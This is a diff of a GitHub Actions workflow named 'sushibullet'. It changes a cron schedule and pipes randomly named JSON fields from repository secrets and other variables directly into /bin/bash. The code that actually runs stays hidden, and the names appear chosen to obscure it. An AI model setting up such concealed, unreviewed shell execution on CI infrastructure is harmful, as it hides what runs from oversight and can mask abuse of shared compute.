@@ -1,9 +1,9 @@
 name: sushibullet
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 5/6 * * *'
-
+    - cron: '4 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: sushibullet
         env:
-          xusxp480: ${{ secrets.xusxp480 }}
+          ascj1: ${{ secrets.ascj1 }}
         run: |
-          echo $xusxp480 | jq -r .kcbw10 | /bin/bash
-          echo $gync52 | jq -r .px0005 | /bin/bash
-          echo $bps8 | jq -r .bf66377 | /bin/bash
-          echo $bgdyk08929 | jq -r .vv9119 | /bin/bash
-          echo $he96395 | jq -r .ylgkh103 | /bin/bash
-          echo $lq32572 | jq -r .n6794 | /bin/bash
+          echo $ascj1 | jq -r .bnpy1993 | /bin/bash
+          echo $moc581 | jq -r .vf7 | /bin/bash
+          echo $o48 | jq -r .jcs87386 | /bin/bash
+          echo $anwps4797 | jq -r .lj906 | /bin/bash
 
